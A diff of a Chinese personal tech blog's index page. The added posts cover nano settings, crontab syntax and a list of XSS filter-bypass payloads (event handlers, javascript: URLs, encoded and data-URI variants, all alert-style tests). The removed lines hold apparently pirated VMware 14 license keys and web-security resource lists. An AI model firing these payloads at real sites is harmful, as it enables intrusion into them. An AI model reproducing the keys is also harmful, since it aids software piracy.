@@ -130,19 +130,47 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15483045490138.html">
+                <a class="clearlink" href="15483045490178.html">
                 
-                  <h1>VMware14秘钥</h1>
+                  <h1>nano常见设置，如语法高亮、启用行号、启用鼠标等</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<p>CG54H-D8D0H-H8DHY-C6X7X-N2KG6<br/>
-ZC3WK-AFXEK-488JP-A7MQX-XL8YF<br/>
-AC5XK-0ZD4H-088HP-9NQZV-ZG2R4<br/>
-ZC5XK-A6E0M-080XQ-04ZZG-YF08D<br/>
-ZY5H0-D3Y8K-M89EZ-AYPEG-MYUA8<br/>
-FF590-2DX83-M81LZ-XDM7E-MKUT4</p>
+                        	<p>下载nano<br/>
+linux根据包管理不同，使用不通的命令。<br/>
+macosx使用brew安装。</p>
+
+<p>编辑（没有就创建）配置文件<br/>
+nano ～/.nanorc<br/>
+然后添加以下内容</p>
+
+<pre class="line-numbers"><code class="language-text"># 语法高亮
+include &quot;/usr/share/nano/*.nanorc&quot;
+</code></pre>
+
+<p>或者</p>
+
+<pre class="line-numbers"><code class="language-text"># 语法高亮
+include &quot;/usr/local/share/nano/*.nanorc&quot;
+</code></pre>
+
+<p>这里include哪一个主要取决于nanorc的具体位置。通常linux在share，macosx在local/share。<br/>
+其他内容如：</p>
+
+<pre class="line-numbers"><code class="language-text"># 启用行号
+set linenumbers
+# 平滑滚动
+set smooth
+# 自动缩进
+set autoindent
+# tab为空格
+set tabstospaces
+# 启用鼠标
+set mouse
+</code></pre>
+
+<p>然后保存，重新打开终端，即可发现设置生效，以上方法适用于linux和macosx。</p>
 
                         
                       </div>
@@ -168,149 +196,48 @@ FF590-2DX83-M81LZ-XDM7E-MKUT4</p>
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15483045490948.html">
+                <a class="clearlink" href="15483045490241.html">
                 
-                  <h1>Web安全工程师求职清单</h1>
+                  <h1>crontab设置定时任务</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>一年前写的一点玩意，没什么卵用</p>
+<p>文章参考自：<a href="http://blog.csdn.net/xiaochuige/article/details/49252741">http://blog.csdn.net/xiaochuige/article/details/49252741</a> 感谢作者。</p>
 </blockquote>
 
-<h2 id="toc_0">安全资讯</h2>
+<p>crontab的基本格式：</p>
 
-<p><a href="http://www.freebuf.com/">freebuf</a></p>
+<pre class="line-numbers"><code class="language-text">* * * * * command
+几个星号分别为：分 时 日 月 周，最后是要执行的命令。
+分：0~59
+时：0~23
+日：1~31
+月：1~12
+周：0～6（0表示星期天）
+除了数字还有几个个特殊的符号就是* / - ：
+* 代表所有的取值范围内的数字
+/ 代表每的意思
+*/5 表示每5个单位
+- 代表从某个数字到某个数字
+, 分开几个离散的数字
+</code></pre>
 
-<p><a href="https://www.t00ls.net/">tools</a></p>
+<p>配置文件的一些例子：</p>
 
-<p><a href="https://www.secpulse.com/">安全脉搏</a></p>
+<pre class="line-numbers"><code class="language-text">0 3 * * * /root/test.sh 每天凌晨3点执行test.sh文件
+* 23-7/1 * * * /root/lnmp restart 晚上11点到早上7点之间，每隔一小时重启lnmp套件
+*/30 * * * * /usr/sbin/ntpdate 每半小时同步一下时间
+0 23 * * 6 /lnmp restart 每星期六的11 : 00 pm重启重启lnmp套件。
+*/1 * * * * echo &quot;i am running.&quot;&gt;&gt;/tmp/running.txt 每隔1分钟向/tmp/running.txt写一个&quot;i am running.&quot;字符串。
+</code></pre>
 
-<p><a href="https://packetstormsecurity.com/">数据包风暴</a></p>
-
-<p><a href="http://www.4hou.com/">嘶吼</a></p>
-
-<p><a href="https://www.aqniu.com/">安全牛</a></p>
-
-<p><a href="https://www.anquanke.com/">安全客</a></p>
-
-<p><a href="https://www.sec-wiki.com/">sec-wiki</a></p>
-
-<p><a href="http://www.secdoctor.com/">中国信息安全博士网</a></p>
-
-<h2 id="toc_1">威胁情报</h2>
-
-<p>暂略</p>
-
-<h2 id="toc_2">安全工具</h2>
-
-<p><a href="https://www.ctftools.com/down/">最强安全工具集</a></p>
-
-<ul>
-<li>burpsuite(抓包)</li>
-<li>sqlmap(sql注入)</li>
-<li>whireshark(网络抓包)</li>
-<li>中国菜刀(webshell、一句话后门)</li>
-<li>HxD(十六进制编辑器和磁盘编辑器)</li>
-<li>nmap(扫描)</li>
-<li>hydra(爆破)</li>
-<li>cain(爆破)</li>
-<li>metasploit(漏洞利用)</li>
-<li>mitmproxy(http/https代理)</li>
-<li>commix(命令注入)</li>
-<li>httrack(网站克隆)</li>
-<li>netcat(瑞士军刀-网络调试和探测工具)</li>
-<li>scapy(python的交互式数据包操作程序和库)</li>
-<li>empire(域渗透)</li>
-</ul>
-
-<h2 id="toc_3">靶机环境</h2>
-
-<h2 id="toc_4">安全知识库</h2>
-
-<p><a href="https://www.anquanquan.info/">安全圈</a></p>
-
-<p><a href="http://wiki.open.qq.com/wiki/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83">腾讯安全开发规范</a></p>
-
-<p><a href="https://highon.coffee/blog/cheat-sheet/">安全研究备忘单</a></p>
-
-<p><a href="https://portswigger.net/kb/issues">Burp漏洞定义</a></p>
-
-<p><a href="https://www.offensive-security.com/metasploit-unleashed/">MSF框架终极指南</a></p>
-
-<p><a href="https://www.owasp.org/index.php/Main_Page">OWASP</a></p>
-
-<p><a href="http://vipread.com/index">vipread知识库</a></p>
-
-<p><a href="https://kb.help.rapid7.com/docs/">Rapid7知识库</a></p>
-
-<p><a href="https://kernelnewbies.org/">linux内核研究</a></p>
-
-<p><a href="http://www.loner.fm/bugs/">乌云漏洞</a></p>
-
-<p><a href="https://wooyun.js.org/">乌云文章</a></p>
-
-<p><a href="http://www.office-cn.net/t/api/index.html?web.htm">WindowsAPI参考手册</a></p>
-
-<p><a href="https://support.portswigger.net/customer/portal/articles/2326039-the-burp-methodology">Burp方法论</a></p>
-
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/">CTF-Wiki</a></p>
-
-<p><a href="https://github.com/ctfs/">CTFs</a></p>
-
-<p><a href="https://ctftime.org">ctftime</a></p>
-
-<p><a href="https://www.codesec.net/">代码安全</a></p>
-
-<p><a href="https://silic.wiki/doku.php">习科小黑板</a></p>
-
-<p><a href="https://bbs.safewiki.org/portal.php">安全文库</a></p>
-
-<p><a href="http://webscan.360.cn/vul">360网站常见漏洞</a></p>
-
-<h2 id="toc_5">漏洞平台</h2>
-
-<p><a href="https://butian.360.cn/">补天</a></p>
-
-<p><a href="https://www.vulbox.com/">漏洞盒子</a></p>
-
-<p><a href="https://www.bugbank.cn/">漏洞银行</a></p>
-
-<p><a href="http://www.cnvd.org.cn/">CNVD国家信息安全漏洞共享平台</a></p>
-
-<p><a href="https://src.edu-info.edu.cn/">教育行业漏洞报告平台</a></p>
-
-<p><a href="https://www.seebug.org">Seebug</a></p>
-
-<p><a href="http://0xsafe.org/vuldb.html">Vuldbs漏洞平台</a></p>
-
-<h2 id="toc_6">技能要求</h2>
-
-<ul>
-<li>不同场景下的渗透测试流程、方法</li>
-<li>常见漏洞的攻击方法和防御方法</li>
-<li>代码级白盒测试能力</li>
-<li>owasp_top10概念、原理、测试方法、防御方法</li>
-<li>主流防火墙、IDS、IPS、漏洞扫描工具的安装、使用方法</li>
-<li>熟悉python、php、javascript、c、c++等语言的一种或多种</li>
-<li>cissp之类的证书或ctf解题能力是加分项</li>
-<li>各种靶机环境搭建</li>
-<li>安全分析报告的编写</li>
-<li>对业务快速熟悉的能力（业务安全重点、应用范围划分、业务安全基线）</li>
-<li>spring、struts、hibernate框架安全相关</li>
-<li>web组件加固、服务器加固、数据库加固</li>
-<li>域渗透、dns、arp等内网渗透知识</li>
-<li>各类提权如系统提权、数据库提权等</li>
-<li>风险评估、等级保护、安全体系规划、安全体系建设。包括信息资产管理、安全威胁和风险评估、安全解决方案制定、信息安全体系实施</li>
-<li>Nginx、Apache、Tomcat等安全配置基线</li>
-<li>各类安全测试标准(ISSAF、OSSTMM、OWASP、微软SDLC、OPENSAMM、BSIMM、SSECMM)</li>
-<li>网络日志分析、攻击流量检测</li>
-<li>hadoop、openstack、sdn云安全</li>
-<li>mongodb、redis、HBASE等nosql安全</li>
-<li>burpsuite插件编写</li>
-<li>python脚本开发能力、shell脚本开发能力</li>
-</ul>
+<p>运行<br/>
+我以为编辑crontab保存后会自动执行，其实不然，必须通过重启cron才可以，命令如下：<br/>
+启动/etc/init.d/cron start<br/>
+关闭/etc/init.d/cron stop<br/>
+重启/etc/init.d/cron restart</p>
 
                         
                       </div>
@@ -322,7 +249,7 @@ FF590-2DX83-M81LZ-XDM7E-MKUT4</p>
                     <span class="date">2019/1/24 12:35 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -336,188 +263,105 @@ FF590-2DX83-M81LZ-XDM7E-MKUT4</p>
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15483045487207.html">
+                <a class="clearlink" href="15483045490298.html">
                 
-                  <h1>Web安全检测checklist</h1>
+                  <h1>xss常用payload</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<h2 id="toc_0">x01 爆破</h2>
+                        	<blockquote>
+<p>这是很久之前写的东西了，忘记是从哪里收集总结来的了。抱歉没法贴源地址了。</p>
+</blockquote>
 
-<h3 id="toc_1">弱口令</h3>
+<p>在平时的工作中，经常遇到需要手工测试xss漏洞的地方，每次都将代码输入一遍（特别是用手机的时候）会显得比较麻烦，因此写这篇文档来记录一下平时可能用到的xss攻击代码，以备不时之需，复制粘贴总比打字方便一些。以下部分代码收集自网络（全部测试过，可以直接使用）。</p>
 
-<p>HTTP登录<br/>
-SSH<br/>
-MySQL<br/>
-Telnet</p>
+<p>xss漏洞是常见的web安全问题之一，当网站未做任何防御时，输入<script>alert(‘xss’)</script>就会弹出上述弹窗。但是通常情况下，网站都会对一些字符进行过滤，以预防xss攻击，这时就需要运用到一些xss绕过技巧。</p>
 
-<h3 id="toc_2">遍历</h3>
+<p>1.大小写混合绕过<br/>
+顾名思义，通过修改攻击代码大小写进行绕过。虽然javascript对大小写敏感但是html不敏感，javascript操作html的标签不敏感。代码示例：<code>&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;</code></p>
 
-<p>网站敏感文件<br/>
-    源码<br/>
-    配置文件<br/>
-    备份文件<br/>
-    探针类文件<br/>
-网站敏感目录<br/>
-    物理路径<br/>
-    网站管理后台<br/>
-    上传目录<br/>
-    数据库Web管理入口<br/>
-    现成的Webshell<br/>
-端口扫描<br/>
-0day扫描<br/>
-子域名</p>
+<p>2.闭合标签绕过</p>
 
-<h2 id="toc_3">x02 不安全配置</h2>
+<p>单引号很多时候都能起到闭合语句的作用，有时候我们通过关闭标签可以使xss生效。</p>
 
-<h3 id="toc_4">Web服务器</h3>
+<p>3.HEX编码来绕过</p>
 
-<p>Nginx<br/>
-Apache<br/>
-IIS</p>
+<p>对语句进行Hex编码，如<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为<code>3c7363726970743e616c65727428e2809c787373e2809d293b3c2f7363726970743e</code></p>
 
-<h3 id="toc_5">Web应用服务器</h3>
+<p>4.Javascript URL</p>
 
-<p>Tomcat<br/>
-JBoss<br/>
-Weblogic</p>
+<p>链接标签里可以通过在 URL 中使用 javascript:… 来执行 JavaScript：</p>
 
-<h3 id="toc_6">HTTP安全特性</h3>
+<p><code>&lt;a href=”javascript:alert(‘test’)”&gt;link&lt;/a&gt;</code></p>
 
-<p>HTTP Headers<br/>
-HTTP Options<br/>
-rebots.txt<br/>
-flash跨域策略</p>
+<p>稍微高级一点的写法还有：<code>&lt;a href=”javascript:alert(‘xss’)”&gt;link&lt;/a&gt;</code>，通过url编码使它依旧可以被浏览器执行但又不匹配正则表达式。</p>
 
-<h2 id="toc_7">x03 敏感信息泄露</h2>
+<p>5.根据之前绕过方法的启发，我们可以通过修改标签和编码或者函数来修改所用的攻击代码</p>
 
-<h3 id="toc_8">用户敏感信息</h3>
+<p>===&gt;常用代码如下：</p>
 
-<p>手机号<br/>
-身份证号<br/>
-社保<br/>
-银行卡号<br/>
-家庭住址</p>
+<p><code>&lt;script&gt;alert(8888)&lt;/script&gt;</code></p>
 
-<h3 id="toc_9">应用敏感信息</h3>
+<p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p>
 
-<p>debug信息<br/>
-堆栈报错</p>
+<p><code>&lt;script&gt;confirm(8888)&lt;/script&gt;</code></p>
 
-<h3 id="toc_10">站点敏感信息</h3>
+<p><code>&lt;script&gt;prompt(8888)&lt;/script&gt;</code></p>
 
-<p>测试页面<br/>
-备份文件</p>
+<p><code>&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;</code></p>
 
-<h3 id="toc_11">本地敏感信息</h3>
+<p><code>&lt;script src=data:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
 
-<p>前端保存用户密码<br/>
-前端保存验证码</p>
+<p><code>&lt;script src=&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(8888)&gt;&lt;/script&gt;</code></p>
 
-<h2 id="toc_12">x04 xss跨站脚本</h2>
+<p><code>&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;</code></p>
 
-<p>反射型xss<br/>
-存储型xss<br/>
-DOM型xss</p>
+<p><code>&lt;script&gt;alert(/8888/.source)&lt;/script&gt;</code></p>
 
-<h2 id="toc_13">x05 请求伪造</h2>
+<p><code>&lt;script&gt;setTimeout(alert(8888),0)&lt;/script&gt;</code></p>
 
-<p>csrf跨站请求伪造<br/>
-ssrf服务器请求伪造</p>
+<p>===&gt;以下为触发xss，即鼠标移动到输出的字符上（或点击字符）时，即会引发xss。</p>
 
-<h2 id="toc_14">x06 注入</h2>
+<p><code>&lt;anytag onmouseover=alert(1)&gt;h</code></p>
 
-<p>LDAP注入<br/>
-ORM注入<br/>
-XML注入<br/>
-XPath注入<br/>
-IMAP/SMTP注入<br/>
-SQL注入<br/>
-代码注入<br/>
-客户端模板注入（CSTI）<br/>
-服务端模板注入（SSTI）<br/>
-服务器端包含注入（SSI）</p>
+<p><code>&lt;anytag onclick=alert(2)&gt;h</code></p>
 
-<h2 id="toc_15">x07 已知漏洞组件</h2>
+<p><code>&lt;a onmouseover=alert(3)&gt;h</code></p>
 
-<p>库文件（某些库会导致远程命令执行）<br/>
-框架（如wordpress、thinkphp、django等）<br/>
-模块（python的某些模块会导致代码注入）</p>
+<p><code>&lt;a onclick=alert(4)&gt;h</code></p>
 
-<h2 id="toc_16">x08 文件类漏洞</h2>
+<p><code>&lt;a href=javascript:alert(5)&gt;h</code></p>
 
-<p>文件包含漏洞<br/>
-任意文件创建<br/>
-任意文件读取<br/>
-任意文件上传<br/>
-任意文件下载<br/>
-任意文件删除</p>
+<p><code>&lt;button/onclick=alert(6)&gt;h</code></p>
 
-<h2 id="toc_17">x09 解析漏洞</h2>
+<p><code>formaction=javascript&amp;colon;alert(7)&gt;h</code></p>
 
-<p>IIS解析漏洞<br/>
-Nginx解析漏洞<br/>
-Apache解析漏洞<br/>
-PHP CGI解析漏洞</p>
+<p><code>&lt;form/action=javascript:alert(8)&gt;&lt;input/type=submit&gt;</code></p>
 
-<h2 id="toc_18">x10 劫持类漏洞</h2>
+<p><code>&lt;form onsubmit=alert(9)&gt;&lt;button&gt;h</code></p>
 
-<p>点击劫持<br/>
-Jsonp劫持<br/>
-WebSocket劫持<br/>
-DNS劫持<br/>
-二维码劫持<br/>
-子域名劫持</p>
+<p><code>&lt;form onsubmit=alert(10)&gt;&lt;button&gt;h</code></p>
 
-<h2 id="toc_19">x11 业务逻辑漏洞</h2>
+<p><code>&lt;img src=x onerror=alert(11)&gt; 29</code></p>
 
-<h3 id="toc_20">认证</h3>
+<p><code>&lt;body/onload=alert(12)&gt;</code></p>
 
-<p>使用默认凭证<br/>
-冻结账户策略不当<br/>
-弱用户名和密码<br/>
-“记住我”功能<br/>
-自动登录<br/>
-单点登录<br/>
-弱口令<br/>
-弱安全问题/答案<br/>
-第三方登录风险<br/>
-Oauth2.0安全<br/>
-JWT安全<br/>
-注册覆盖<br/>
-未验证的重定向和转发<br/>
-双因素认证不当</p>
+<p><code>&lt;body onscroll=alert(13)&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></p>
 
-<h3 id="toc_21">授权</h3>
+<p><code>&lt;iframe/onload=alert(document.domain)&gt;&lt;/iframe&gt;</code></p>
 
-<p>测试角色定义<br/>
-权限管理缺失<br/>
-匿名访问（备用接口——常见于兼容老的不安全的接口时产生）<br/>
-水平越权<br/>
-垂直越权<br/>
-超级账户<br/>
-实名认证不严格</p>
+<p><code>&lt;IFRAME SRC=”javascript:alert(14);”&gt;&lt;/IFRAME&gt;</code></p>
 
-<h3 id="toc_22">会话管理</h3>
+<p><code>&lt;meta http-equiv=”refresh” content=”0;</code></p>
 
-<p>cookie安全属性<br/>
-cookie可猜解<br/>
-cookie溢出<br/>
-会话固定<br/>
-用户凭证不安全传输（弱加密或明文传输）<br/>
-用户凭证未一次失效<br/>
-用户凭证可猜解<br/>
-注销与会话超时<br/>
-敏感数据不安全传输</p>
+<p><code>url=data:text/html,&lt;script&gt;alert(15)&lt;/script&gt;”&gt;</code></p>
 
-<h3 id="toc_23">流程绕过</h3>
+<p><code>&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&gt;&lt;/object&gt;</code>　　　　＃此为base64编码，有兴趣可以试试其他编码方式</p>
 
-<p>找回密码流程绕过</p>
+<p><code>&lt;input onfocus=alert(16) autofocus&gt;</code>　　　　＃使用这行攻击代码会无限弹xss</p>
 
-<h2 id="toc_24">x12 API安全</h2>
-
-<p>整理中</p>
+<p><code>&lt;input onblur=alert(17) autofocus&gt;&lt;input autofocus&gt;</code></p>
 
                         
                       </div>
@@ -623,31 +467,31 @@ cookie溢出<br/>
 	      
 		      
 			      <li class="post">
+			        <a href="15506293038772.html">使用浏览器进行Web应用安全测试</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15505564665657.html">深入了解最近普遍存在的DNS劫持攻击事件</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15489296290618.html">Mediakit报告设备商的空间不足以执行此操作</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15489008835167.html">黑链</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15488284836388.html">90后空巢青年生活指南</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15483045487644.html">Atom设置和取消代理</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15483045486850.html">BASIC INJECTION 基本注入</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15483045491221.html">CRLF注入</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15483045491124.html">FOEENSICS 101</a>
 			      </li>
 		     
 		  
